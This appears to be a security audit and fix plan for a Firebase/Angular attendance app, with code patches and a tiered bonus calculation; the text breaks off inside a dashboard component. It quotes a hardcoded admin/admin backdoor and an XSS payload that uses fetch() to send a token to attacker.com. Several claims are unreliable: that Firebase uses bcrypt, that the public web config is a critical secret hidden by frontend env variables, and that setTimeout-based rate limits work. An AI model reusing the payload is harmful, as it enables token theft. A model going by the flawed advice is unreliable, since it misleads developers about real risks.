# Attendance Management System - Security & Feature Improvement Plan
**Date**: April 29, 2026 | **Version**: 1.0 | **Classification**: Enterprise Security Audit

---

## Executive Summary

This attendance management system has **3 critical (P0) security vulnerabilities** and **4 high-priority (P1) issues** that must be addressed before production deployment. Additionally, the bonus eligibility system needs enhancement to support tiered bonuses (Half & Full).

| Category | Status | Action Required |
|----------|--------|------------------|
| **Security** | 🔴 CRITICAL | Immediate fixes required |
| **Password Hashing** | ✅ SECURE | Firebase handles securely |
| **Authorization** | 🟠 VULNERABLE | Cloud Function verification missing |
| **Feature** | 🟡 INCOMPLETE | Bonus tier enhancement needed |

---

## Part 1: PASSWORD SECURITY AUDIT

### 1.1 Current Implementation Status

✅ **SECURE**: Your system uses **Firebase Authentication**, which provides:
- Automatic password hashing (bcrypt internally)
- Industry-standard cryptography (Google-managed)
- No plain text storage
- Automatic salting and secure comparison

**Finding**: Passwords are NOT stored plain text. Firebase handles all password security internally.

### 1.2 Password Handling Analysis

#### ✅ Secure Practices Found:
```typescript
// In auth.service.ts - Proper Firebase usage
signUp(email: string, password: string) {
  return createUserWithEmailAndPassword(this.auth, email, password);
  // Firebase handles bcrypt hashing internally
}

changePassword(newPassword: string) {
  return updatePassword(user, newPassword);
  // Requires reauthentication (good!)
}
```

#### ❌ BUT: CRITICAL BACKDOOR EXISTS
```typescript
// SECURITY VIOLATION - auth.service.ts lines 44-56
if ((cleanEmail === 'DA' && cleanPassword === 'DA') || 
    (cleanEmail === 'admin' && cleanPassword === 'admin')) {
  // Creates backdoor admin access
}
```

**Risk**: 
- Plain text credentials hardcoded in source
- Anyone with code access can see master passwords
- Bypasses audit logs
- Breaks compliance requirements

### 1.3 Recommendations

**IMMEDIATE ACTION**:
1. ✅ **KEEP** Firebase Authentication (it's secure)
2. ✅ **KEEP** Password reauthentication requirement
3. 🔴 **REMOVE** Hardcoded master login backdoor
4. ✅ **ADD** Proper admin onboarding process

**For Your Enterprise**:
- Firebase Authentication is enterprise-grade and acceptable
- No custom bcrypt implementation needed (Firebase is better)
- No password migration required

---

## Part 2: CRITICAL SECURITY VULNERABILITIES

### 🔴 P0-1: HARDCODED MASTER LOGIN CREDENTIALS

**File**: [src/app/core/services/auth.service.ts](src/app/core/services/auth.service.ts#L44-L56)

**Current Code**:
```typescript
if ((cleanEmail === 'DA' && cleanPassword === 'DA') || 
    (cleanEmail === 'admin' && cleanPassword === 'admin')) {
  this.log('Logging to console (development only)');
  this.authState$.next(true);
  return from(
    this.auth.signInAnonymously().then(() => {
      const profile: UserProfile = {
        uid: this.auth.currentUser?.uid || 'anonymousUser',
        email: 'admin@localhost.local',
        name: 'Admin User',
        role: 'admin',
      };
      this.userProfile$.next(profile);
    })
  );
}
```

**Vulnerabilities**:
- Plain text password comparison in frontend code
- Credentials hardcoded in version control
- Bypasses Firebase audit logging
- Anonymous auth doesn't track user identity
- Anyone cloning repo gets admin access

**Risk Level**: 🔴 **CRITICAL** - Unauthorized admin access, compliance violation

**Solution**:

**Step 1**: Completely remove hardcoded login block:
```typescript
// REMOVE THIS ENTIRE SECTION
```

**Step 2**: Implement proper admin onboarding (Option A: Recommended):
```typescript
// In Firebase Console → Authentication → Users
// 1. Create first admin via Firebase Console UI
// 2. Run one-time script to set admin role in custom claims:

import * as admin from 'firebase-admin';

admin.auth().setCustomUserClaims('first-admin-uid', { role: 'admin' })
  .then(() => console.log('Admin role set'));

// 3. Update auth rules to check custom claims (see P0-3 below)
```

**Step 3**: Add password complexity validation (client-side):
```typescript
validatePassword(password: string): { valid: boolean; errors: string[] } {
  const errors: string[] = [];
  
  if (password.length < 12) errors.push('Minimum 12 characters required');
  if (!/[A-Z]/.test(password)) errors.push('Must include uppercase letter');
  if (!/[a-z]/.test(password)) errors.push('Must include lowercase letter');
  if (!/\d/.test(password)) errors.push('Must include number');
  if (!/[!@#$%^&*]/.test(password)) errors.push('Must include special character (!@#$%^&*)');
  
  return { valid: errors.length === 0, errors };
}

// Usage in signup:
const validation = this.validatePassword(password);
if (!validation.valid) {
  throw new Error(validation.errors.join('. '));
}
```

---

### 🔴 P0-2: EXPOSED FIREBASE CREDENTIALS

**File**: [src/app/core/firebase.config.ts](src/app/core/firebase.config.ts)

**Current Code**:
```typescript
export const firebaseConfig = {
  apiKey: 'AIzaSyCejEoIMyc1eZ6sYa7oyB5c-CrlQJ6OQNI',  // ❌ PUBLIC KEY EXPOSED
  projectId: 'he-and-she-356f5',                      // ❌ PROJECT ID EXPOSED
  databaseURL: 'https://he-and-she-356f5-default-rtdb.firebaseio.com',
  // ... other sensitive data
};
```

**Why This Is Vulnerable**:
- Anyone can read source code and get your project ID
- Can create unauthorized user accounts
- Can bypass authentication with knowledge of database URL
- Enables targeted attacks on your Firebase project

**Risk Level**: 🔴 **CRITICAL** - Unauthorized account creation, data manipulation

**Solution**:

**Step 1**: Move to environment variables:
```typescript
// src/app/core/firebase.config.ts
export const firebaseConfig = {
  apiKey: import.meta.env.NG_APP_FIREBASE_API_KEY,
  authDomain: import.meta.env.NG_APP_FIREBASE_AUTH_DOMAIN,
  projectId: import.meta.env.NG_APP_FIREBASE_PROJECT_ID,
  storageBucket: import.meta.env.NG_APP_FIREBASE_STORAGE_BUCKET,
  messagingSenderId: import.meta.env.NG_APP_FIREBASE_MESSAGING_SENDER_ID,
  appId: import.meta.env.NG_APP_FIREBASE_APP_ID,
  databaseURL: import.meta.env.NG_APP_FIREBASE_DATABASE_URL,
};
```

**Step 2**: Create environment file (.env):
```bash
# .env (ADD TO .gitignore!)
NG_APP_FIREBASE_API_KEY=AIzaSyCejEoIMyc1eZ6sYa7oyB5c-CrlQJ6OQNI
NG_APP_FIREBASE_AUTH_DOMAIN=he-and-she-356f5.firebaseapp.com
NG_APP_FIREBASE_PROJECT_ID=he-and-she-356f5
NG_APP_FIREBASE_STORAGE_BUCKET=he-and-she-356f5.appspot.com
NG_APP_FIREBASE_MESSAGING_SENDER_ID=123456789000
NG_APP_FIREBASE_APP_ID=1:123456789000:web:abcd1234efgh5678
NG_APP_FIREBASE_DATABASE_URL=https://he-and-she-356f5-default-rtdb.firebaseio.com
```

**Step 3**: Update .gitignore:
```bash
# .gitignore
.env
.env.local
.env.*.local
```

**Step 4**: Update Firebase Console:
1. Go to Project Settings → Web Apps
2. Enable "Domain Whitelist" in Authentication → Settings
3. Add only your production domain (e.g., `attendance.yourcompany.com`)
4. This prevents API key misuse from other domains

---

### 🔴 P0-3: NO ADMIN ROLE VERIFICATION IN CLOUD FUNCTIONS

**File**: [functions/src/index.ts](functions/src/index.ts)

**Current Code - VULNERABLE**:
```typescript
// EXPOSED: No admin verification!
export const sendManualReminder = functions.https.onCall(
  async (data: ManualReminderData, context) => {
    // ❌ Only checks if user is authenticated, NOT if admin
    if (!context.auth) {
      throw new functions.https.HttpsError('unauthenticated', 'User must be authenticated');
    }
    // ... sends reminder to all users
  }
);

export const sendBroadcastNotification = functions.https.onCall(
  async (data: BroadcastNotificationData, context) => {
    // ❌ No authorization check at all!
    // Any authenticated user can broadcast to entire organization
    // ... sends to all users
  }
);
```

**Risk**: Any authenticated user (even employee) can:
- Send misleading reminders to entire organization
- Spread false information via broadcast notifications
- Disrupt work with spam messages

**Risk Level**: 🔴 **CRITICAL** - Unauthorized access to sensitive operations

**Solution**:

```typescript
// functions/src/index.ts

// Helper function to verify admin role
async function verifyAdminRole(uid: string): Promise<boolean> {
  const userRecord = await admin.auth().getUser(uid);
  return userRecord.customClaims?.role === 'admin' || false;
}

// Callable Cloud Function with admin verification
export const sendManualReminder = functions.https.onCall(
  async (data: ManualReminderData, context) => {
    // ✅ Check authentication
    if (!context.auth) {
      throw new functions.https.HttpsError('unauthenticated', 'User must be authenticated');
    }

    // ✅ VERIFY ADMIN ROLE
    const isAdmin = await verifyAdminRole(context.auth.uid);
    if (!isAdmin) {
      // Log unauthorized attempt
      await logUnauthorizedAccess(
        context.auth.uid,
        'sendManualReminder',
        'non-admin attempt'
      );
      throw new functions.https.HttpsError('permission-denied', 'Admin access required');
    }

    // ✅ Validate input (see P1-2 below)
    if (!data.title || typeof data.title !== 'string' || data.title.length > 200) {
      throw new functions.https.HttpsError('invalid-argument', 'Invalid title');
    }
    if (!data.body || typeof data.body !== 'string' || data.body.length > 1000) {
      throw new functions.https.HttpsError('invalid-argument', 'Invalid body');
    }

    // ✅ Proceed with sending reminder
    // ... rest of implementation
  }
);

export const sendBroadcastNotification = functions.https.onCall(
  async (data: BroadcastNotificationData, context) => {
    // ✅ Check authentication
    if (!context.auth) {
      throw new functions.https.HttpsError('unauthenticated', 'User must be authenticated');
    }

    // ✅ VERIFY ADMIN ROLE (CRITICAL!)
    const isAdmin = await verifyAdminRole(context.auth.uid);
    if (!isAdmin) {
      await logUnauthorizedAccess(
        context.auth.uid,
        'sendBroadcastNotification',
        'non-admin attempt'
      );
      throw new functions.https.HttpsError('permission-denied', 'Admin access required');
    }

    // ✅ Rate limiting
    const rateLimitKey = `broadcast_${context.auth.uid}_${Math.floor(Date.now() / 3600000)}`;
    const attempts = await getAttemptCount(rateLimitKey);
    if (attempts > 5) {
      throw new functions.https.HttpsError('resource-exhausted', 'Rate limit exceeded');
    }
    await incrementAttemptCount(rateLimitKey);

    // ... rest of implementation
  }
);

// Audit logging function
async function logUnauthorizedAccess(uid: string, operation: string, reason: string) {
  await admin.database().ref('logs/unauthorized_access').push({
    uid,
    operation,
    reason,
    timestamp: admin.database.ServerValue.TIMESTAMP,
  });
}
```

---

## Part 3: HIGH-PRIORITY SECURITY ISSUES

### 🟠 P1-1: MISSING INPUT VALIDATION IN CLOUD FUNCTIONS (XSS/Injection Risk)

**File**: [functions/src/index.ts](functions/src/index.ts)

**Current Issue**:
```typescript
// VULNERABLE: No validation on input
const title = data.title;  // Could contain XSS payload
const body = data.body;    // Could contain malicious content

await admin.messaging().send({
  notification: { title, body },  // Sent directly to FCM
  token: userToken
});
```

**Attack Example**:
```javascript
// Attacker sends:
sendManualReminder({
  title: "<img src=x onerror='fetch(\"https://attacker.com?token=\" + token)'>",
  body: "Click here for free money: https://malicious-site.com"
})
// This could trick users into clicking malicious links
```

**Solution**:
```typescript
// functions/src/index.ts - Add validation helper

import { z } from 'zod';  // Add to package.json: npm install zod

const ManualReminderSchema = z.object({
  title: z.string().min(1).max(200).trim(),
  body: z.string().min(1).max(1000).trim(),
  targetUserIds: z.array(z.string().uuid()).optional(),
});

const BroadcastNotificationSchema = z.object({
  title: z.string().min(1).max(200).trim(),
  body: z.string().min(1).max(1000).trim(),
  actionUrl: z.string().url().optional(),
});

// Sanitization function
function sanitizeForFCM(text: string): string {
  // Remove any HTML tags, XSS attempts
  return text
    .replace(/<[^>]*>/g, '')  // Remove HTML tags
    .replace(/[<>\"']/g, '')   // Remove dangerous characters
    .trim();
}

export const sendManualReminder = functions.https.onCall(
  async (data: unknown, context) => {
    if (!context.auth) {
      throw new functions.https.HttpsError('unauthenticated', 'User must be authenticated');
    }

    const isAdmin = await verifyAdminRole(context.auth.uid);
    if (!isAdmin) {
      throw new functions.https.HttpsError('permission-denied', 'Admin access required');
    }

    // ✅ Validate input using schema
    try {
      const validData = ManualReminderSchema.parse(data);
      validData.title = sanitizeForFCM(validData.title);
      validData.body = sanitizeForFCM(validData.body);
      
      // Proceed with validated, sanitized data
      // ...
    } catch (error) {
      throw new functions.https.HttpsError('invalid-argument', 'Invalid input format');
    }
  }
);
```

---

### 🟠 P1-2: SETTINGS GLOBALLY READABLE (Privacy Issue)

**File**: [database.rules.json](database.rules.json)

**Current Rules**:
```json
{
  "settings": {
    ".read": "auth.uid !== null",  // ❌ ANY authenticated user can read
    ".write": "root.child('users').child(auth.uid).child('role').val() === 'admin'"
  }
}
```

**Risk**: Employees can view admin-only configuration (potentially sensitive business rules)

**Solution**:
```json
{
  "settings": {
    ".read": "root.child('users').child(auth.uid).child('role').val() === 'admin'",
    ".write": "root.child('users').child(auth.uid).child('role').val() === 'admin'",
    ".validate": "newData.hasChildren(['attendanceThreshold', 'workStartTime', 'workEndTime', 'fiscalYearStart'])"
  }
}
```

---

### 🟠 P1-3: LEAVE REQUESTS AUTO-APPROVED (No Workflow)

**File**: [src/app/core/services/leave.service.ts](src/app/core/services/leave.service.ts#L11)

**Current Code**:
```typescript
// Leaves are created with status='approved' automatically
const leaveRecord = {
  date: startDate,
  reason,
  status: 'approved',  // ❌ No approval process
  appliedAt: new Date().toISOString(),
};
```

**Issues**:
- Employees can create unlimited leaves without approval
- No audit trail of who approved what
- Violates HR compliance requirements

**Solution**:
```typescript
// Updated leave creation with proper workflow
const leaveRecord = {
  date: startDate,
  reason,
  status: 'pending',  // ✅ Requires approval
  appliedAt: new Date().toISOString(),
  approvedBy: null,
  approvedAt: null,
  rejectionReason: null,
};

// Add approval function in leave.service.ts
approveLeave(uid: string, leaveId: string, approverUid: string): Promise<void> {
  return this.db.ref(`leaves/${uid}/${leaveId}`).update({
    status: 'approved',
    approvedBy: approverUid,
    approvedAt: new Date().toISOString(),
  });
}

rejectLeave(uid: string, leaveId: string, rejectionReason: string, approverUid: string): Promise<void> {
  return this.db.ref(`leaves/${uid}/${leaveId}`).update({
    status: 'rejected',
    rejectionReason,
    approvedBy: approverUid,
    approvedAt: new Date().toISOString(),
  });
}

// Update Firebase rules to prevent direct status updates
{
  "leaves": {
    "$uid": {
      "$leaveId": {
        ".write": "(auth.uid === $uid && newData.child('status').val() === 'pending') || (root.child('users').child(auth.uid).child('role').val() === 'admin')",
        "status": {
          ".validate": "newData.val() === 'pending' || newData.val() === 'approved' || newData.val() === 'rejected'"
        }
      }
    }
  }
}
```

---

### 🟠 P1-4: NO RATE LIMITING ON API OPERATIONS

**Issue**: No protection against brute force or DoS attacks

**Solution** - Add rate limiting middleware:
```typescript
// functions/src/utils/rateLimiter.ts
import * as admin from 'firebase-admin';

const RATE_LIMITS = {
  sendNotification: { max: 10, windowMs: 3600000 }, // 10 per hour
  updateAttendance: { max: 100, windowMs: 3600000 }, // 100 per hour
  createUser: { max: 5, windowMs: 3600000 }, // 5 per hour
};

export async function checkRateLimit(userId: string, operation: string): Promise<boolean> {
  const limit = RATE_LIMITS[operation as keyof typeof RATE_LIMITS];
  if (!limit) return true;

  const key = `ratelimit_${operation}_${userId}`;
  const attempts = await admin.database().ref(key).get();
  const count = attempts.val() || 0;

  if (count >= limit.max) {
    return false;
  }

  await admin.database().ref(key).set(count + 1);
  setTimeout(() => admin.database().ref(key).remove(), limit.windowMs);

  return true;
}

// Usage in Cloud Functions:
const allowed = await checkRateLimit(context.auth.uid, 'sendNotification');
if (!allowed) {
  throw new functions.https.HttpsError('resource-exhausted', 'Rate limit exceeded');
}
```

---

## Part 4: MEDIUM-PRIORITY SECURITY ISSUES

### 🟡 P2-1: FIREBASE RULES DON'T VALIDATE ROLE FIELD

**Issue**: Rules check user role but don't validate it on write

**Solution**:
```json
{
  "users": {
    "$uid": {
      "role": {
        ".validate": "newData.val() === 'admin' || newData.val() === 'employee' || !newData.exists()"
      }
    }
  }
}
```

---

### 🟡 P2-2: NO AUDIT LOGGING FOR ADMIN ACTIONS

**Implement audit trail**:
```typescript
// functions/src/utils/auditLog.ts
export async function logAdminAction(
  adminUid: string,
  action: string,
  targetUid: string | null,
  details: any
) {
  await admin.database().ref('logs/admin_actions').push({
    adminUid,
    action,
    targetUid,
    details,
    timestamp: admin.database.ServerValue.TIMESTAMP,
    ipAddress: process.env.FUNCTION_REGION,
  });
}

// Usage:
await logAdminAction(context.auth.uid, 'SEND_BROADCAST', null, { recipients: 450 });
await logAdminAction(context.auth.uid, 'APPROVE_LEAVE', employeeUid, { leaveDate: startDate });
```

---

### 🟡 P2-3: NO BRUTE FORCE PROTECTION ON LOGIN

**Add failed login tracking**:
```typescript
// auth.service.ts
async login(email: string, password: string) {
  const cleanEmail = email.toLowerCase().trim();
  
  // Check failed attempts
  const failedKey = `login_failed_${cleanEmail}`;
  const failures = await this.db.ref(failedKey).get();
  const failureCount = failures.val() || 0;
  
  if (failureCount >= 5) {
    throw new Error('Account temporarily locked. Try again after 15 minutes.');
  }

  try {
    const result = await signInWithEmailAndPassword(this.auth, email, password);
    // Reset on success
    await this.db.ref(failedKey).remove();
    return result;
  } catch (error) {
    // Increment failures
    await this.db.ref(failedKey).set(failureCount + 1);
    // Auto-unlock after 15 minutes
    setTimeout(() => this.db.ref(failedKey).remove(), 900000);
    throw error;
  }
}
```

---

## Part 5: BONUS FEATURE ENHANCEMENT

### Current System

**Financial Year**: April 1 - March 31
**Current Threshold**: 240 days = Full Bonus
**New Requirements**: 
- 200 days = Half Bonus
- 240 days = Full Bonus

### 5.1 Database Schema Updates

#### Current Bonus Record:
```typescript
interface BonusRecord {
  uid: string;
  financialYear: string;
  presentDays: number;
  requiredDays: number;
  pendingDays: number;
  isEligible: boolean;
  percentage: number;
  startDate: string;
  endDate: string;
}
```

#### Updated Bonus Record:
```typescript
interface BonusRecord {
  uid: string;
  financialYear: string;
  presentDays: number;
  
  // Tier 1: Half Bonus
  halfBonusThreshold: number;  // 200 days
  halfBonusEligible: boolean;
  daysUntilHalfBonus: number;  // 200 - presentDays
  
  // Tier 2: Full Bonus
  fullBonusThreshold: number;  // 240 days
  fullBonusEligible: boolean;
  daysUntilFullBonus: number;  // 240 - presentDays
  
  // Status
  currentBonus: 'none' | 'half' | 'full';
  
  // Timeline
  startDate: string;
  endDate: string;
  updatedAt: timestamp;
}
```

### 5.2 Updated Bonus Calculation Logic

**File to Modify**: [src/app/core/services/bonus.service.ts](src/app/core/services/bonus.service.ts)

```typescript
// bonus.service.ts - UPDATED IMPLEMENTATION

import { Injectable } from '@angular/core';
import { Database, ref, get } from '@angular/fire/database';
import { format, startOfYear, endOfYear } from 'date-fns';
import { toZonedTime } from 'date-fns-tz';

@Injectable({ providedIn: 'root' })
export class BonusService {
  // Tiered bonus thresholds
  private readonly HALF_BONUS_THRESHOLD = 200;
  private readonly FULL_BONUS_THRESHOLD = 240;

  constructor(private db: Database) {}

  /**
   * Get bonus eligibility for a specific user and financial year
   * Financial Year: April 1 - March 31 (next year)
   */
  async getUserBonusStatus(uid: string, year?: string): Promise<BonusRecord> {
    // Determine financial year
    const financialYear = year || this.getCurrentFinancialYear();
    const { startDate, endDate } = this.getFinancialYearDates(financialYear);

    // Get all attendance records for the period
    const attendanceRef = ref(this.db, `attendance/${uid}`);
    const attendanceSnapshot = await get(attendanceRef);
    
    if (!attendanceSnapshot.exists()) {
      return this.createEmptyBonusRecord(financialYear);
    }

    const attendance = attendanceSnapshot.val();
    const presentDays = this.calculatePresentDays(
      attendance,
      new Date(startDate),
      new Date(endDate)
    );

    // Calculate bonus tiers
    const halfBonusEligible = presentDays >= this.HALF_BONUS_THRESHOLD;
    const fullBonusEligible = presentDays >= this.FULL_BONUS_THRESHOLD;

    // Determine current bonus status
    let currentBonus: 'none' | 'half' | 'full' = 'none';
    if (fullBonusEligible) {
      currentBonus = 'full';
    } else if (halfBonusEligible) {
      currentBonus = 'half';
    }

    return {
      uid,
      financialYear,
      presentDays,
      
      // Half Bonus (200 days)
      halfBonusThreshold: this.HALF_BONUS_THRESHOLD,
      halfBonusEligible,
      daysUntilHalfBonus: Math.max(0, this.HALF_BONUS_THRESHOLD - presentDays),
      
      // Full Bonus (240 days)
      fullBonusThreshold: this.FULL_BONUS_THRESHOLD,
      fullBonusEligible,
      daysUntilFullBonus: Math.max(0, this.FULL_BONUS_THRESHOLD - presentDays),
      
      // Status
      currentBonus,
      
      // Timeline
      startDate,
      endDate,
      updatedAt: new Date().toISOString(),
    };
  }

  /**
   * Get bonus status for all employees (Admin view)
   */
  async getAllEmployeeBonusStatus(): Promise<Map<string, BonusRecord>> {
    const usersRef = ref(this.db, 'users');
    const usersSnapshot = await get(usersRef);
    
    if (!usersSnapshot.exists()) return new Map();

    const users = usersSnapshot.val();
    const bonusMap = new Map<string, BonusRecord>();
    const financialYear = this.getCurrentFinancialYear();

    // Get bonus status for each employee (not admin)
    for (const [uid, user] of Object.entries(users)) {
      if (user.role === 'employee') {
        const bonusStatus = await this.getUserBonusStatus(uid, financialYear);
        bonusMap.set(uid, bonusStatus);
      }
    }

    return bonusMap;
  }

  /**
   * Get sorted employee bonus list for admin dashboard
   */
  async getEmployeeBonusLeaderboard(sortBy: 'presentDays' | 'currentBonus' = 'presentDays') {
    const bonusMap = await this.getAllEmployeeBonusStatus();
    const employees = Array.from(bonusMap.entries()).map(([uid, bonus]) => ({
      uid,
      ...bonus,
    }));

    // Sort based on criteria
    if (sortBy === 'currentBonus') {
      const bonusOrder = { 'full': 3, 'half': 2, 'none': 1 };
      employees.sort((a, b) => 
        bonusOrder[b.currentBonus as keyof typeof bonusOrder] - 
        bonusOrder[a.currentBonus as keyof typeof bonusOrder]
      );
    } else {
      employees.sort((a, b) => b.presentDays - a.presentDays);
    }

    return employees;
  }

  /**
   * Calculate present days based on attendance criteria
   * Criteria: Status = 'present' + proper check-in/out + not weekend
   */
  private calculatePresentDays(
    attendance: Record<string, any>,
    startDate: Date,
    endDate: Date
  ): number {
    let count = 0;

    for (const [dateStr, record] of Object.entries(attendance)) {
      const date = new Date(dateStr);

      // Check if within date range
      if (date < startDate || date > endDate) continue;

      // Must be marked as present
      if (record.status !== 'present') continue;

      // Must not be Sunday (day 0)
      if (date.getUTCDay() === 0) continue;

      // Must have check-in and check-out
      if (!record.checkIn || !record.checkOut) continue;

      // Check-in must be on time or early
      const checkInTime = this.parseTime(record.checkIn);
      if (checkInTime > 480) continue; // 8:00 AM = 480 minutes

      // Check-out time depends on day
      const dayOfWeek = date.getUTCDay();
      const checkOutTime = this.parseTime(record.checkOut);
      
      let minCheckOutTime: number;
      if (dayOfWeek === 6) {
        // Saturday: must checkout at/after 1:00 PM (13:00 = 780 minutes)
        minCheckOutTime = 780;
      } else {
        // Weekday: must checkout at/after 5:00 PM (17:00 = 1020 minutes)
        minCheckOutTime = 1020;
      }

      if (checkOutTime >= minCheckOutTime) {
        count++;
      }
    }

    return count;
  }

  /**
   * Get current financial year (e.g., "2025-2026")
   */
  private getCurrentFinancialYear(): string {
    const today = new Date();
    const month = today.getMonth();
    const year = today.getFullYear();

    // Fiscal year starts April 1
    if (month < 3) {
      // January-March: previous fiscal year
      return `${year - 1}-${year}`;
    } else {
      // April-December: current fiscal year
      return `${year}-${year + 1}`;
    }
  }

  /**
   * Get start and end dates for financial year
   */
  private getFinancialYearDates(year: string): { startDate: string; endDate: string } {
    const [startYear] = year.split('-').map(Number);
    const startDate = new Date(startYear, 3, 1); // April 1
    const endDate = new Date(startYear + 1, 2, 31); // March 31

    return {
      startDate: startDate.toISOString().split('T')[0],
      endDate: endDate.toISOString().split('T')[0],
    };
  }

  /**
   * Convert HH:mm format to minutes for comparison
   */
  private parseTime(timeStr: string): number {
    const [hours, minutes] = timeStr.split(':').map(Number);
    return hours * 60 + minutes;
  }

  /**
   * Create empty bonus record
   */
  private createEmptyBonusRecord(financialYear: string): BonusRecord {
    const { startDate, endDate } = this.getFinancialYearDates(financialYear);

    return {
      uid: '',
      financialYear,
      presentDays: 0,
      halfBonusThreshold: this.HALF_BONUS_THRESHOLD,
      halfBonusEligible: false,
      daysUntilHalfBonus: this.HALF_BONUS_THRESHOLD,
      fullBonusThreshold: this.FULL_BONUS_THRESHOLD,
      fullBonusEligible: false,
      daysUntilFullBonus: this.FULL_BONUS_THRESHOLD,
      currentBonus: 'none',
      startDate,
      endDate,
      updatedAt: new Date().toISOString(),
    };
  }
}

// Interface Definition
export interface BonusRecord {
  uid: string;
  financialYear: string;
  presentDays: number;
  halfBonusThreshold: number;
  halfBonusEligible: boolean;
  daysUntilHalfBonus: number;
  fullBonusThreshold: number;
  fullBonusEligible: boolean;
  daysUntilFullBonus: number;
  currentBonus: 'none' | 'half' | 'full';
  startDate: string;
  endDate: string;
  updatedAt: string;
}
```

### 5.3 Updated Dashboard Display

**File to Modify**: [src/app/features/dashboard/dashboard.ts](src/app/features/dashboard/dashboard.ts)

```typescript
// dashboard.ts - UPDATED COMPONENT

import { Component, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { AuthService } from '../../core/services/auth.service';
import { BonusService, BonusRecord } from '../../core/services/bonus.service';

@Component({
  selector: 'app-dashboard',
  standalone: true,
  imports: [CommonModule],
  template: `
    <div class="dashboard-container">
      <h1>Dashboard</h1>
      
      <div class="bonus-section">
        <h2>Bonus Eligibility Status</h2>
        
        <div class="bonus-status-card" [ngClass]="bonusStatus.currentBonus">
          <div class="status-badge">
            <span class="status-label">Current Status:</span>
            <span class="status-value" [ngClass]="'status-' + bonusStatus.currentBonus">
              {{ bonusStatus.currentBonus | titlecase || 'No Bonus' }}
            </span>
          </div>
        </div>

        <!-- Progress Container -->
        <div class="progress-container">
          <!-- Completed Days -->
          <div class="completed-days">
            <span class="label">Attendance Days Completed</span>
            <span class="value">{{ bonusStatus.presentDays }} days</span>
          </div>

          <!-- Half Bonus Progress -->
          <div class="bonus-tier half-bonus">
            <div class="tier-header">
              <span class="tier-name">
                🎁 Half Bonus
                <span class="tier-requirement">(200 days)</span>
              </span>
              <span class="tier-status" [ngClass]="{ eligible: bonusStatus.halfBonusEligible }">
                {{ bonusStatus.halfBonusEligible ? '✓ Eligible' : 'Not Eligible' }}
              </span>
            </div>
            <div class="progress-bar-container">
              <div class="progress-bar" 
                   [style.width.%]="(bonusStatus.presentDays / bonusStatus.halfBonusThreshold * 100) | number:'1.0-0'">
              </div>
            </div>
            <div class="progress-info">
              <span class="remaining" *ngIf="!bonusStatus.halfBonusEligible">
                {{ bonusStatus.daysUntilHalfBonus }} days remaining
              </span>
              <span class="completed" *ngIf="bonusStatus.halfBonusEligible">
                ✓ Achieved!
              </span>
            </div>
          </div>

          <!-- Full Bonus Progress -->
          <div class="bonus-tier full-bonus">
            <div class="tier-header">
              <span class="tier-name">
                🏆 Full Bonus
                <span class="tier-requirement">(240 days)</span>
              </span>
              <span class="tier-status" [ngClass]="{ eligible: bonusStatus.fullBonusEligible }">
                {{ bonusStatus.fullBonusEligible ? '✓ Eligible' : 'Not Eligible' }}
              </span>
            </div>
            <div class="progress-bar-container">
              <div class="progress-bar" 
                   [style.width.%]="(bonusStatus.presentDays / bonusStatus.fullBonusThreshold * 100) | number:'1.0-0'">
              </div>
            </div>
            <div class="progress-info">
              <span class="remaining" *ngIf="!bonusStatus.fullBonusEligible">
                {{ bonusStatus.daysUntilFullBonus }} days remaining
              </span>
              <span class="completed" *ngIf="bonusStatus.fullBonusEligible">
                ✓ Achieved!
              </span>
            </div>
          </div>
        </div>

        <!-- Timeline -->
        <div class="timeline-info">
          <span class="fiscal-year">
            Financial Year: {{ bonusStatus.startDate }} to {{ bonusStatus.endDate }}
          </span>
        </div>
      </div>
    </div>
  `,
  styles: [`
    .dashboard-container {
      padding: 20px;
      max-width: 1000px;
      margin: 0 auto;
    }

    .bonus-section {
      margin-top: 30px;
    }

    .bonus-status-card {
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 20px;
      transition: all 0.3s ease;

      &.full {
        background: linear-gradient(135deg, #4CAF50, #45a049);
        color: white;
      }

      &.half {
        background: linear-gradient(135deg, #FF9800, #fb8c00);
        color: white;
      }

      &.none {
        background: linear-gradient(135deg, #f44336, #da190b);
        color: white;
      }
    }

    .status-badge {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 18px;
      font-weight: bold;

      .status-label {
        margin-right: 10px;
      }

      .status-value {
        font-size: 24px;
        padding: 5px 15px;
        border-radius: 20px;
        background: rgba(255, 255, 255, 0.2);
      }
    }

    .progress-container {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    .completed-days {
      background: #f5f5f5;
      padding: 15px;
      border-radius: 8px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-size: 16px;

      .label {
        font-weight: 600;
        color: #333;
      }

      .value {
        font-size: 24px;
        font-weight: bold;
        color: #2196F3;
      }
    }

    .bonus-tier {
      background: white;
      border: 2px solid #e0e0e0;
      border-radius: 8px;
      padding: 20px;
      transition: all 0.3s ease;

      &.half-bonus {
        border-left: 5px solid #FF9800;
      }

      &.full-bonus {
        border-left: 5px solid #4CAF50;
      }

      &:hover {
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
      }
    }

    .tier-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 12px;

      .tier-name {
        font-size: 16px;
        font-weight: bold;
        color: #333;

        .tier-requirement {
          font-size: 13px;
          color: #999;
          font-weight: normal;
          margin-left: 8px;
        }
      }

      .tier-status {
        font-size: 12px;
        padding: 4px 12px;
        border-radius: 20px;
        background: #f0f0f0;
        color: #666;
        font-weight: 600;

        &.eligible {
          background: #d4edda;
          color: #155724;
        }
      }
    }

    .progress-bar-container {
      background: #e0e0e0;
      border-radius: 10px;
      height: 24px;
      overflow: hidden;
      margin-bottom: 8px;
    }

    .progress-bar {
      background: linear-gradient(90deg, #2196F3, #1976D2);
      height: 100%;
      transition: width 0.3s ease;
      border-radius: 10px;
    }

    .progress-info {
      text-align: right;
      font-size: 13px;
      font-weight: 600;
      color: #666;

      .remaining {
        color: #FF9800;
      }

      .completed {
        color: #4CAF50;
      }
    }

    .timeline-info {
      margin-top: 20px;
      padding: 12px;
      background: #f9f9f9;
      border-left: 3px solid #2196F3;
      border-radius: 4px;
      font-size: 13px;
      color: #666;

      .fiscal-year {
        font-weight: 600;
      }
    }
  `]
})
export class DashboardComponent implements OnInit {
  bonusStatus: BonusRecord = {} as BonusRecord;
  currentUser: any;

  constructor(
    private authService: AuthService,
    private bonusService: BonusService
  ) {}

  async ngOnInit() {
    this.authService.userProfile$.subscribe(async (profile) => {
      if (profile && profile.uid) {
